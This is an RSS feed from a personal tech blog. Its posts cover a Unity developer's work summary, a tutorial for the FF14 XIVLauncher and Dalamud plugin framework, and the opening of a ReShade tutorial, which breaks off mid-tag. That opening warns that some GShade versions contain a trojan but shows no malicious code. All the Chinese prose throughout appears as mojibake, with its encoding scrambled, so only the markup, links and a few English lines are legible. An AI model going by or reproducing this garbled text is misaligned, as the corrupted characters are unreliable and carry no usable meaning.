<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Jckling&#39;s Blog</title>
    <link>https://jckling.github.io/</link>
    
    <atom:link href="https://jckling.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Sun, 07 Jan 2024 14:41:59 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>å·¥ä½œæ€»ç»“</title>
      <link>https://jckling.github.io/2023/12/12/Notes/%E5%B7%A5%E4%BD%9C%E6%80%BB%E7%BB%93/</link>
      <guid>https://jckling.github.io/2023/12/12/Notes/%E5%B7%A5%E4%BD%9C%E6%80%BB%E7%BB%93/</guid>
      <pubDate>Tue, 12 Dec 2023 03:47:30 GMT</pubDate>
      
      <description>ç®€å•æ¦‚æ‹¬å·¥ä½œå†…å®¹</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç®€å•æ¦‚æ‹¬å·¥ä½œå†…å®¹</p><h1 id="é¡¹ç›®"><a href="#é¡¹ç›®" class="headerlink" title="é¡¹ç›®"></a>é¡¹ç›®</h1><h2 id="å¾®ä¿¡å°æ¸¸æˆ"><a href="#å¾®ä¿¡å°æ¸¸æˆ" class="headerlink" title="å¾®ä¿¡å°æ¸¸æˆ"></a>å¾®ä¿¡å°æ¸¸æˆ</h2><ol><li><p>ä½¿ç”¨ <a href="https://github.com/wechat-miniprogram/minigame-unity-webgl-transform/tree/main">è½¬æ¢å·¥å…·</a> å°†é¡¹ç›®æ‰“åŒ…ä¸ºå°æ¸¸æˆ</p></li><li><p>ä½¿ç”¨ <a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html">å¾®ä¿¡å¼€å‘è€…å·¥å…·</a> ä¸ <a href="https://docs.unity3d.com/Manual/Profiler.html">Unity Profiler</a> è¿›è¡Œè°ƒè¯•</p></li><li><p>å¼€å‘å·¥å…·é¢æ¿</p><ul><li><a href="https://forum.unity.com/threads/listview-strange-index-problem-when-scrolling.807000/">ListView strange index Problem when scrolling - Unity Forum</a></li><li><a href="https://forum.unity.com/threads/clearing-previous-registervaluechangedcallbacks-or-passing-custom-arguments-to-the-callback.1042819/">Clearing previous RegisterValueChangedCallbacks or passing custom arguments to the callback? - Unity Forum</a></li><li><a href="https://docs.unity.cn/Manual/UIE-ListView-TreeView.html">Unity - Manual: Create list and tree views</a></li><li><a href="https://docs.unity3d.com/Manual/TreeViewAPI.html">Unity - Manual: TreeView</a></li></ul></li></ol><h2 id="MyLink"><a href="#MyLink" class="headerlink" title="MyLink"></a>MyLink</h2><ol><li><p>UI ç›¸å…³çš„ bugfix</p><ul><li><p>æ»‘åŠ¨æ¡æ˜¾ç¤ºé—®é¢˜ï¼š<a href="https://forum.unity.com/threads/custom-image-for-slider-fill-not-scaling-correctly.911072/#post-6537784">Custom image for slider fill not scaling correctly</a></p></li><li><p>ä¸åŒæ–¹å‘çš„æ»‘åŠ¨é€Ÿåº¦ä¸åŒï¼š<a href="https://stackoverflow.com/questions/75571907/c-sharp-unity-camera-moving-up-and-down-speed-is-very-slow">C# Unity camera moving up and down speed is very slow</a></p></li><li><p>auto-size å¯¼è‡´æ¯é¡¹çš„æ–‡å­—å¤§å°éƒ½ä¸ç›¸åŒï¼š<a href="https://forum.unity.com/threads/textmeshpro-precull-dorebuilds-performance.762968/#post-5083490">TextMeshPro - Precull DoRebuilds performance</a></p></li><li><p>å°†ç›¸æœºé™åˆ¶åœ¨è±å½¢èŒƒå›´å†…ï¼ˆæ—‹è½¬ 45 åº¦ï¼‰ï¼š<a href="https://math.stackexchange.com/questions/190111/how-to-check-if-a-point-is-inside-a-rectangle">How to check if a point is inside a rectangle?</a></p></li><li><p>é¿å…è‹±æ–‡å•è¯æ–­è¡Œï¼š<a href="https://docs.unity3d.com/Packages/com.unity.textmeshpro@4.0/manual/RichTextNoBreak.html">No Break | TextMeshPro | 4.0.0-pre.2</a></p></li><li><p>æ£€æµ‹ç‰©ä½“æ˜¯å¦åœ¨ç›¸æœºå¯è§†èŒƒå›´å†…ï¼š<a href="https://stackoverflow.com/questions/46364719/unity-how-do-i-check-if-an-object-is-seen-by-the-main-camera">Unity-How do I check if an object is seen by the Main Camera</a></p></li><li><p>åˆ‡æ¢è¯­è¨€å UI æ²¡æœ‰è‡ªé€‚åº”ä¼¸ç¼©ï¼š<a href="https://forum.unity.com/threads/content-size-fitter-refresh-problem.498536/">Content size fitter refresh problem</a></p></li></ul></li><li><p>ä¿®æ”¹ UI prefabï¼Œé€‚é… <code>expand</code> æ¨¡å¼ï¼ˆCanvas Scalerï¼‰</p></li></ol><h2 id="Cloud-Rendering"><a href="#Cloud-Rendering" class="headerlink" title="Cloud Rendering"></a>Cloud Rendering</h2><ol><li><p>WebSocket å¼€å‘ï¼šå¤ç”¨ rpc + protobuf</p><ul><li><p>æŠ€æœ¯æ ˆï¼šGolangã€MongoDBã€TypeScript</p></li><li><p>éš¾ç‚¹ï¼šæ•°æ®æ ¼å¼ã€CORS</p></li></ul></li><li><p>ç›‘æ§å¹³å°ï¼š<a href="https://github.com/jckling/observability-demo">observability-demo</a></p></li></ol><h2 id="AI-Digital-Humans"><a href="#AI-Digital-Humans" class="headerlink" title="AI Digital Humans"></a>AI Digital Humans</h2><p>å¤§æ¨¡å‹ + <a href="https://www.nvidia.com/en-us/omniverse/">Ominiverse</a></p><ol><li><p>C# åŠŸèƒ½éªŒè¯ï¼šlivelinkã€streaming audio player</p></li><li><p>ä¿®æ”¹ python æºç æä¾› APIï¼šExportBlendshapeJsonã€ExportAnimationJsonã€DownloadTrackã€SetExpireTime</p></li><li><p>å¹³å°å¼€å‘ï¼šDocker + MongoDB + Golang</p></li><li><p>Unity è„šæœ¬å¯¹æ¥ï¼šPlatformClientã€AvatarClient</p></li><li><p>Bug Fixï¼šåŠ¨ä½œé‡å¤ã€åŠ¨ä½œæŒ‡ä»¤æŒç»­æ—¶é—´ã€ä»»åŠ¡ä¸¢å¤±ç­‰</p></li></ol><h2 id="GLY"><a href="#GLY" class="headerlink" title="GLY"></a>GLY</h2><ol><li><p>UI é¢æ¿å¼€å‘ï¼šéš¾ç‚¹åœ¨äºéœ€è¦åå¤„ç†æ‰èƒ½å’Œè®¾è®¡å¯¹ä¸Šï¼Œåˆ›å»º prefab å’Œæ˜¾ç¤º UI çš„é€»è¾‘æ¯”è¾ƒåŸºç¡€</p></li><li><p>æ¸¸æˆä¿å­˜åŠŸèƒ½å¼€å‘ï¼š<a href="https://assetstore.unity.com/packages/tools/utilities/easy-save-the-complete-save-data-serializer-system-768">Easy Save - The Complete Save Data &amp; Serializer System | Utilities Tools | Unity Asset Store</a></p></li></ol><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><ol><li><p>æºç æ‹‰å–ã€ç¼–è¯‘ã€è°ƒè¯•</p></li><li><p>Asset å·¥ä½œæµåˆ†æ</p><ul><li><p>å¯¼å…¥å™¨</p></li><li><p>Metadata</p></li><li><p>èµ„æºæ•°æ®åº“ï¼šSourceAssetDBã€ArtifactDB</p></li><li><p>Asset å¯¼å…¥&#x2F;å¯¼å‡ºæµç¨‹ï¼šæ–‡ä»¶å¯¼å…¥é¡ºåºã€è°ƒç”¨æ ˆ</p></li><li><p>Build Pipelineã€Asset Bundle</p></li></ul></li></ol><h2 id="OpenHarmony"><a href="#OpenHarmony" class="headerlink" title="OpenHarmony"></a>OpenHarmony</h2><p>å°†æ¸¸æˆæ‰“åŒ…ä¸º <code>.hpk</code> å¹¶åœ¨çœŸæœºä¸Šè¿›è¡Œæµ‹è¯•</p><ol><li><p>Angry Botsï¼š<a href="https://github.com/jckling/AngryBots_CSharp">jckling&#x2F;AngryBots_CSharp</a></p></li><li><p>Angry Bots2</p></li></ol><h2 id="ä½ä»£ç ç¼–è¾‘å™¨"><a href="#ä½ä»£ç ç¼–è¾‘å™¨" class="headerlink" title="ä½ä»£ç ç¼–è¾‘å™¨"></a>ä½ä»£ç ç¼–è¾‘å™¨</h2><ol><li><p>è¿è¡Œåœ¨äº‘ç¼–è¾‘å™¨ä¸Šçš„ Demoï¼šå³å°è£…äº†ä¸€å±‚ layout</p><ul><li><p>ç”¨åˆ° UIElements å’Œ <code>.wlt</code> æ–‡ä»¶</p></li><li><p>è¯•äº†ä¸‹ ModeService ä¼¼ä¹ä¸å¤ªè¡Œ</p></li></ul></li></ol><h2 id="Dotnet-Serialization-Benchmark"><a href="#Dotnet-Serialization-Benchmark" class="headerlink" title="Dotnet Serialization Benchmark"></a>Dotnet Serialization Benchmark</h2><ol><li>æ¯”è¾ƒå„ä¸ªåºåˆ—åŒ–æ¡†æ¶çš„æ€§èƒ½ï¼š<a href="https://github.com/jckling/Dotnet-Serialization-Benchmark">Dotnet-Serialization-Benchmark</a></li></ol><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><p>è‡ªå­¦ Unity æ•™ç¨‹</p><ol><li><p><a href="https://github.com/jckling/2DAdventure">2DAdventure</a></p></li><li><p><a href="https://github.com/jckling/3DRPG">3DRPG</a></p></li><li><p><a href="https://github.com/jckling/farm">Farm</a></p></li></ol>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Notes/">Notes</category>
      
      
      <category domain="https://jckling.github.io/tags/Unity/">Unity</category>
      
      
      <comments>https://jckling.github.io/2023/12/12/Notes/%E5%B7%A5%E4%BD%9C%E6%80%BB%E7%BB%93/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>FF14 XIVLauncher å¯åŠ¨å™¨ä¸ Dalamud å«æœˆæ¡†æ¶ä½¿ç”¨æ•™ç¨‹</title>
      <link>https://jckling.github.io/2023/09/02/Game/FFXIV/FF14-XIVLauncher+Dalamud%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</link>
      <guid>https://jckling.github.io/2023/09/02/Game/FFXIV/FF14-XIVLauncher+Dalamud%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</guid>
      <pubDate>Sat, 02 Sep 2023 08:48:08 GMT</pubDate>
      
      <description>é€‚ç”¨äºå›½æœçš„ FFXIVQuickLauncher å¯åŠ¨å™¨ï¼Œé›†æˆ Dalamud å«æœˆæ¡†æ¶ï¼›å›½é™…æœå¯åŠ¨å™¨è¯·ä¸‹è½½ goatcorp/FFXIVQuickLauncher å®‰è£…</description>
      
      
      
      <content:encoded><![CDATA[<div class="note warning flat"><ol><li><p>å›½æœ 6.45 å¯ä»¥ä½¿ç”¨ <a href="https://github.com/ottercorp/FFXIVQuickLauncher/releases/tag/6.3.7-beta2">6.3.7-beta2</a>ã€‚</p></li><li><p>æ— æ³•è®¿é—®&#x2F;ä¸‹è½½è¯·å°è¯•æŒ‚æ¢¯å­ã€‚</p></li></ol><p><em>PSï¼šè¯„è®ºå®¡æ ¸éœ€è¦æ—¶é—´ï¼Œä¸è¦é‡å¤åˆ·è¯„è®º</em> ğŸ†˜</p></div><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰çœ‹åˆ° Textools çš„ä¸Šä½æ›¿ä»£å·¥å…· <a href="https://github.com/xivdev/Penumbra">Penumbra</a> éœ€è¦é€šè¿‡ <a href="https://github.com/goatcorp/Dalamud">Dalamud</a> å«æœˆæ¡†æ¶å®‰è£…ï¼Œè€Œå«æœˆæ¡†æ¶åˆå’Œ <a href="https://github.com/goatcorp/FFXIVQuickLauncher">FFXIVQuickLauncher</a> å¯åŠ¨å™¨ç»‘å®šï¼Œè¿™äº›å·¥å…·éƒ½åªæ”¯æŒå›½é™…æœã€‚</p><p>ä½†æ˜¯æœ‰å¼€å‘è€…è´¡çŒ®äº†é€‚ç”¨äºå›½æœçš„ç‰ˆæœ¬ <a href="https://github.com/ottercorp/FFXIVQuickLauncher">ottercorp&#x2F;FFXIVQuickLauncher</a>ï¼Œç”šè‡³è¿˜æä¾›äº†æ±‰åŒ–ä¸æ’ä»¶æ”¯æŒï¼ˆæ„Ÿæ©ï¼‰ï¼Œè¿™å°±æ¥ä½“éªŒä¸€ä¸‹ï¼</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>ä» Github ä»“åº“ <a href="https://github.com/ottercorp/FFXIVQuickLauncher">ottercorp&#x2F;FFXIVQuickLauncher</a> ä¸‹è½½å®‰è£…ç¨‹åºï¼Œæˆ–ä» <a href="https://pan.baidu.com/s/1qIrelIy2zd4b3QU95CkXTw?pwd=zlyp">ç™¾åº¦ç½‘ç›˜</a> ä¸‹è½½ï¼š</p><img src="https://s2.loli.net/2023/09/08/DTMqc3QAOy4kCGE.png" ><p>åŒå‡»è¿è¡Œå®‰è£…ç¨‹åºï¼Œå®šä½ FF14 æ¸¸æˆç›®å½•</p><img src="https://s2.loli.net/2023/09/08/72E4dTyGmhfbIxu.png" ><p>é€‰æ‹© DirectX ç‰ˆæœ¬ï¼Œé€‰æ‹©è¯­è¨€ï¼Œé€‰æ‹©æ˜¯å¦å¯ç”¨ Dalamudï¼ˆå«æœˆæ¡†æ¶ï¼‰</p><div class="gallery-container" data-type="data" data-button="">      <div class="gallery-data">[{"url":"https://s2.loli.net/2023/09/08/XCLeOVnBgoDQcz1.png","alt":""},{"url":"https://s2.loli.net/2023/09/08/zdkXoIewPmujxJG.png","alt":""},{"url":"https://s2.loli.net/2023/09/08/7qm25ib39VOuPNA.png","alt":""}]</div>      <div class="gallery-items">      </div>    </div><p>å¦‚æœæŠ¥é”™åˆ™è¯´æ˜æƒé™ä¸å¤Ÿï¼Œéœ€è¦æ¢ä¸ªç›®å½•ï¼Œå³é”® <code>ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ</code> ä¼¼ä¹æ— æ³•è§£å†³</p><img src="https://s2.loli.net/2023/09/08/8t6duF47XvZNaUA.png" ><h1 id="ä½¿ç”¨å¯åŠ¨å™¨"><a href="#ä½¿ç”¨å¯åŠ¨å™¨" class="headerlink" title="ä½¿ç”¨å¯åŠ¨å™¨"></a>ä½¿ç”¨å¯åŠ¨å™¨</h1><p>å·¦ä¾§æ–°é—»åˆ—è¡¨ï¼Œå³ä¾§ç™»å½•æ¡†ï¼Œåœ°çƒå›¾æ ‡æ˜¯å…¨æœåŠ¡å™¨çŠ¶å†µä¸€è§ˆï¼Œé½¿è½®å›¾æ ‡æ˜¯è®¾ç½®ã€‚</p><img src="https://s2.loli.net/2023/09/08/aOBGxnMFiYSJcer.jpg" ><p>å¯ä»¥åœ¨è®¾ç½®ç•Œé¢çš„ <code>è‡ªåŠ¨å¯åŠ¨</code> ä¸­æ·»åŠ è·Ÿéš FF14 æ¸¸æˆå¯åŠ¨çš„è½¯ä»¶ï¼Œç‚¹å‡» <code>æ–°å¢</code> æ·»åŠ è½¯ä»¶ã€‚</p><img src="https://s2.loli.net/2023/09/08/LOSI8bge5fsajHr.jpg" ><p>è¿˜èƒ½åœ¨è®¾ç½®ç•Œé¢æŸ¥çœ‹å·²å®‰è£…çš„ Dalamud æ’ä»¶ï¼Œç‚¹å‡»å³ä¸‹è§’çš„ âˆš è¿”å›ç™»å½•ç•Œé¢ã€‚</p><img src="https://s2.loli.net/2023/09/08/zlgOBG2Wpuko5cU.png" ><p>å³é”®ç™»å½•æŒ‰é’®ï¼Œå¯ä»¥è¿›è¡Œä¿®å¤å’Œæ›´æ–°ç­‰è®¾ç½®ã€‚</p><img src="https://s2.loli.net/2023/09/08/KylZj29GnxOD4WH.jpg" ><p>è¾“å…¥ç››è¶£è´¦å·ç‚¹å‡»ç™»å½•ï¼Œç™»å½•æ—¶ä¼šå¼¹å‡ºäºŒç»´ç ï¼Œéœ€è¦ä½¿ç”¨å¨é±¼æ‰«æç™»å½•ã€‚</p><img src="https://s2.loli.net/2023/09/08/WMFzuQHbl3Vw1rZ.jpg" ><p>é€‰æ‹© <code>å¿«é€Ÿç™»å½•</code>ï¼Œä»…åœ¨é¦–æ¬¡ç™»å½•æ—¶éœ€è¦æ‰«æäºŒç»´ç ï¼Œå†æ¬¡ç™»å½•å¯ä»¥ç›´æ¥è¿›å…¥æ¸¸æˆã€‚ç‚¹å‡»è´¦å·æŒ‰é’®ï¼Œå¼¹å‡ºæ‰€æœ‰å·²è®°å½•çš„è´¦å·ã€‚</p><img src="https://s2.loli.net/2023/09/08/wNtupKEZTjO1QmG.jpg" ><p>è´¦å·æœ«å°¾çš„æ ‡å¿—è¡¨ç¤ºå¯ä»¥ç›´æ¥è¿›è¡Œå¿«é€Ÿç™»å½•ï¼Œå³é”®è´¦å·å¯ä»¥è¿›è¡Œæ“ä½œã€‚</p><img src="https://s2.loli.net/2023/09/08/XrYT7Vszx6LPvIB.jpg" ><p>å¯åŠ¨æ¸¸æˆæ—¶ï¼Œå¦‚æœå®‰è£…äº† GShade è¿˜ä¼šè¿›è¡Œå…¼å®¹æ€§ä¿®å¤ï¼Œè¿™ä¸ªé€‰æ‹©æ˜¯æˆ–å¦éƒ½å¯ä»¥ã€‚</p><img src="https://s2.loli.net/2023/09/08/aGCU7Jlyb4MAN83.png" ><h1 id="ä½¿ç”¨å«æœˆæ¡†æ¶ï¼ˆDalamudï¼‰"><a href="#ä½¿ç”¨å«æœˆæ¡†æ¶ï¼ˆDalamudï¼‰" class="headerlink" title="ä½¿ç”¨å«æœˆæ¡†æ¶ï¼ˆDalamudï¼‰"></a>ä½¿ç”¨å«æœˆæ¡†æ¶ï¼ˆDalamudï¼‰</h1><h2 id="è¿›å…¥æ¸¸æˆå‰"><a href="#è¿›å…¥æ¸¸æˆå‰" class="headerlink" title="è¿›å…¥æ¸¸æˆå‰"></a>è¿›å…¥æ¸¸æˆå‰</h2><p>ç™»å½•åæ¸¸æˆç•Œé¢å·¦ä¾§ä¼šæ˜¾ç¤º Dalamud å›¾æ ‡ï¼Œç‚¹å‡»åå±•å¼€ä¸¤é¡¹</p><ol><li>æ’ä»¶å®‰è£…å™¨</li><li>Dalamud è®¾ç½®</li></ol><img src="https://s2.loli.net/2023/09/08/tvFbyGJHDIhUci8.jpg" ><p>æ’ä»¶å®‰è£…å™¨ç”¨äºå®‰è£…å’Œæ›´æ–°æ’ä»¶ï¼Œé»˜è®¤æƒ…å†µä¸‹æ’ä»¶ä¸æ˜¯è‡ªåŠ¨æ›´æ–°çš„ã€‚</p><img src="https://s2.loli.net/2023/09/08/Gj9zhMaA8ofYenI.jpg" ><p>Dalamud è®¾ç½®ï¼Œåœ¨è¿™é‡Œå¯ä»¥å¯ç”¨æ’ä»¶çš„è‡ªåŠ¨æ›´æ–°ï¼Œè®¾ç½®ä½•æ—¶éšè—ç­‰ã€‚</p><img src="https://s2.loli.net/2023/09/08/oQtLlF51k4AP28e.jpg" ><h2 id="xl-å‘½ä»¤"><a href="#xl-å‘½ä»¤" class="headerlink" title="xl å‘½ä»¤"></a>xl å‘½ä»¤</h2><p>åœ¨è¾“å…¥æ¡†ä¸­é”®å…¥ <code>/xlhelp</code> æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/xlhelp: æ˜¾ç¤ºå¯ç”¨å‘½ä»¤åˆ—è¡¨ã€‚</span><br><span class="line">/xlmute: å±è”½èŠå¤©é‡Œå‡ºç°çš„å•è¯æˆ–å¥å­ã€‚ç”¨æ³•ï¼š/xlmute &lt;å•è¯æˆ–å¥å­&gt;</span><br><span class="line">/xlmutelist: åˆ—å‡ºå±è”½å•è¯æˆ–å¥å­ã€‚</span><br><span class="line">/xlunmute: å–æ¶ˆå±è”½å•è¯æˆ–å¥å­ã€‚ç”¨æ³•ï¼š/xlunmute &lt;å•è¯æˆ–å¥å­&gt;</span><br><span class="line">/ll: åœ¨æ‚¨çš„é»˜è®¤æµè§ˆå™¨ä¸­æ‰“å¼€ä¸Šæ¬¡æ¥æ”¶åˆ°çš„é“¾æ¥ã€‚</span><br><span class="line">/xlbgmset: è®¾ç½®æ¸¸æˆèƒŒæ™¯éŸ³ä¹ã€‚ç”¨æ³•ï¼š/xlbgmset &lt;BGM ID&gt;</span><br><span class="line">/xlplugins: æ‰“å¼€æ’ä»¶å®‰è£…å™¨</span><br><span class="line">/xllanguage: è®¾ç½® Dalamud å’Œæ’ä»¶çš„è¯­è¨€ã€‚å¯ç”¨è¯­è¨€ï¼š en, de, ja, fr, it, es, zh</span><br><span class="line">/xlsettings: æ›´æ”¹ä¸åŒçš„æ¸¸æˆå†…é™„åŠ ç»„ä»¶è®¾ç½®ï¼Œå¦‚èŠå¤©é¢‘é“å’Œ Discord æœºå™¨äººè®¾ç½®ã€‚</span><br><span class="line">/xlversion: Dalamud version info</span><br><span class="line">/xlui: Toggle Dalamud UI display modes. Native UI modifications may also be affected by this, but that depends on the plugin.</span><br></pre></td></tr></table></figure><p>å¦‚æœå®‰è£…äº†æ’ä»¶ï¼Œåˆ™ä¼šæ˜¾ç¤ºæ’ä»¶ç›¸å…³çš„æŒ‡ä»¤ï¼Œä¾‹å¦‚å®‰è£…äº† <a href="https://github.com/fmauNeko/MarketBoardPlugin">Market Board</a> æ’ä»¶ï¼Œä¼šé¢å¤–æ˜¾ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/pmb: Open the market board window.</span><br></pre></td></tr></table></figure><h2 id="ä»è®¾ç½®æ‰“å¼€"><a href="#ä»è®¾ç½®æ‰“å¼€" class="headerlink" title="ä»è®¾ç½®æ‰“å¼€"></a>ä»è®¾ç½®æ‰“å¼€</h2><p>æ’ä»¶å®‰è£…å™¨å’Œ Dalamud è®¾ç½®å¯ä»¥ä» FF14 çš„è®¾ç½®é¢æ¿æ‰“å¼€ã€‚</p><p><a href="https://smms.app/image/wJgKHZvpAVROC9y" target="_blank"><img src="https://s2.loli.net/2023/09/08/wJgKHZvpAVROC9y.jpg" ></p><h2 id="å…¶ä»–æ’ä»¶"><a href="#å…¶ä»–æ’ä»¶" class="headerlink" title="å…¶ä»–æ’ä»¶"></a>å…¶ä»–æ’ä»¶</h2><p>æ’ä»¶å®‰è£…å™¨é¢æ¿ä¸­å¯èƒ½æ‰¾ä¸åˆ°ä¸€äº›æ’ä»¶ï¼Œæ¯”å¦‚æ¼”å¥æ’ä»¶ <a href="https://github.com/reckhou/MidiBard/blob/api6/README%20-%20CN.md">reckhou&#x2F;MidiBard</a> å°±éœ€è¦æ‰‹åŠ¨æ·»åŠ ã€‚</p><p>åœ¨ Dalamud è®¾ç½®çš„æµ‹è¯•ç‰ˆé€‰é¡¹ä¸­ï¼Œæ·»åŠ è‡ªå®šä¹‰æ’ä»¶ä»“åº“ï¼Œè¿˜å¯ä»¥é…ç½®ä»£ç†ï¼Œä¿®æ”¹å®Œè®°å¾—ç‚¹å‡»ä¿å­˜ï¼</p><img src="https://s2.loli.net/2023/09/08/FkxSTjvqh5MsGCB.jpg" ><p>æ’ä»¶å®‰è£…å™¨ä¼šé‡æ–°åŠ è½½ï¼Œç­‰å¾…åŠ è½½å®Œæ¯•åå°±å¯ä»¥æœç´¢åˆ°æ·»åŠ çš„æ’ä»¶äº†ã€‚</p><img src="https://s2.loli.net/2023/09/08/uIWOrT5f7389npM.jpg" ><p>å…¶ä»–æ’ä»¶åˆ—è¡¨å¯ä»¥æŸ¥çœ‹ï¼š</p><ul><li><a href="https://ottercorp.github.io/DalamudPlugins/plugins.html">CN Neat Plugins</a></li><li><a href="https://blog.littlenightmare.top/2021/05/18/%E5%8D%AB%E6%9C%88%E4%BB%93%E5%BA%93%E9%93%BE%E6%8E%A5/">å«æœˆä»“åº“é“¾æ¥æ•´ç†</a></li></ul><h2 id="æ›´æ–°"><a href="#æ›´æ–°" class="headerlink" title="æ›´æ–°"></a>æ›´æ–°</h2><p>æœ‰æ—¶å€™è¿›å…¥æ¸¸æˆä¼šå¼¹çª—æç¤ºå«æœˆæ¡†æ¶æ›´æ–°ã€‚</p><img src="https://s2.loli.net/2023/09/08/vuHzbtLDw8S4iFB.jpg" ><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li>å›½æœå¯åŠ¨å™¨ï¼š<a href="https://github.com/ottercorp/FFXIVQuickLauncher">ottercorp&#x2F;FFXIVQuickLauncher</a></li><li>å›½é™…æœå¯åŠ¨å™¨ï¼š<a href="https://github.com/goatcorp/FFXIVQuickLauncher">goatcorp&#x2F;FFXIVQuickLauncher</a></li><li><a href="https://www.bilibili.com/read/cv18623774/">[FF14]å…³äºFF14å«æœˆç¬¬ä¸‰æ–¹ç™»å½•å™¨FFXIVQuickLauncherï¼ˆè“é¹Šï¼‰çš„ä½¿ç”¨æ–¹æ³•ï¼šwegameä¸é€‚ç”¨</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Game/">Game</category>
      
      
      <category domain="https://jckling.github.io/tags/FFXIV/">FFXIV</category>
      
      
      <comments>https://jckling.github.io/2023/09/02/Game/FFXIV/FF14-XIVLauncher+Dalamud%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>FF14 ReShade ä½¿ç”¨æ•™ç¨‹</title>
      <link>https://jckling.github.io/2023/08/30/Game/FFXIV/FF14-ReShade%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</link>
      <guid>https://jckling.github.io/2023/08/30/Game/FFXIV/FF14-ReShade%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</guid>
      <pubDate>Wed, 30 Aug 2023 14:11:14 GMT</pubDate>
      
      <description>åˆ«å†ç”¨åŒ…å«æœ¨é©¬ç¨‹åºçš„ GShadeï¼ˆv4.1.1 åŠä¹‹åçš„ç‰ˆæœ¬ï¼‰äº†ï¼æ”¹ç”¨ ReShade æˆ–å®‰è£…æ—§ç‰ˆ GShade v4.0.3</description>
      
      
      
      <content:encoded><![CDATA[<div class="note warning flat"><ol><li><p>å›½æœï¼ˆ6.45ï¼‰å¯ä»¥ä½¿ç”¨ <a href="https://reshade.me/downloads/ReShade_Setup_5.9.2_Addon.exe">ReShade 5.9.2</a>ã€‚</p></li><li><p>ReShade æ”¯æŒ DX9ã€DX10ã€DX11ã€DX12ã€OpenGLã€Vulkanï¼›æ”¯æŒ Win7 SP1ã€Win8.1ã€Win10ã€Win11ï¼›éœ€è¦å®‰è£… .NET Framework 4.6.2 åŠä»¥ä¸Šçš„è¿è¡Œæ—¶ã€‚</p></li><li><p>æ— æ³•è®¿é—®&#x2F;ä¸‹è½½è¯·å°è¯•æŒ‚æ¢¯å­ã€‚</p></li></ol><p><em>PSï¼šè¯„è®ºå®¡æ ¸éœ€è¦æ—¶é—´ï¼Œä¸è¦é‡å¤åˆ·è¯„è®º</em> ğŸ†˜</p></div><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>GShade ç»å†ä¸‹çº¿ä¹‹ååˆæ¢å¤äº†ï¼Œä½†æ˜¯åŒ…å«æœ¨é©¬ç¨‹åºğŸ˜… ç°åœ¨æ‰€è°“çš„â€œå®˜ç½‘â€å’Œâ€œå®˜æ–¹ä»“åº“â€éƒ½æ˜¯ç”±ä¹‹å‰é‚£ä½å¾€ v4.1.1 é‡Œå¡æ¶æ„ä»£ç çš„ç¾å›½ç¨‹åºå‘˜ç»´æŠ¤ï¼ˆç¦»è°±ï¼‰ï¼Œä¸å»ºè®®ä½¿ç”¨ï¼</p><p>é™¤äº†ä½¿ç”¨æ—§ç‰ˆ GShade å¹¶ç¦ç”¨æ›´æ–°ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ç›´æ¥æ”¹ç”¨ ReShadeã€‚å¦‚æœæƒ³ç›´æ¥ä½¿ç”¨æ—§ç‰ˆ GSahde å¯ä»¥å‚è€ƒ <a href="https://jckling.github.io/2021/05/02/Game/FFXIV/FF14-GShade%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">FF14 GShade ä½¿ç”¨æ•™ç¨‹</a> æˆ–æœ¬æ–‡çš„ã€Œ6.2. æ–¹æ³•äºŒï¼šå®‰è£…æ—§ç‰ˆ GShadeã€ä¸€èŠ‚ã€‚</p><p>ReShade ä¸æ˜¯é’ˆå¯¹ FFXIV çš„ä¸“é—¨å·¥å…·ï¼Œè€Œæ˜¯é€‚ç”¨äºå„ç§ç”µå­æ¸¸æˆçš„å·¥å…·ï¼Œæ”¯æŒçš„æ¸¸æˆå¯ä»¥æŸ¥é˜… <a href="https://www.pcgamingwiki.com/wiki/ReShade#Compatibility_list">Compatibility list</a>ï¼Œä¹Ÿæœ‰ç½‘æ¸¸æ˜ç¡®ç¦æ­¢ä½¿ç”¨ ReShadeï¼Œè¯¦è§ <a href="https://www.pcgamingwiki.com/wiki/ReShade#Online_games_to_avoid">Online games to avoid</a>ã€‚</p><h1 id="ä¸‹è½½å®‰è£…ç¨‹åº"><a href="#ä¸‹è½½å®‰è£…ç¨‹åº" 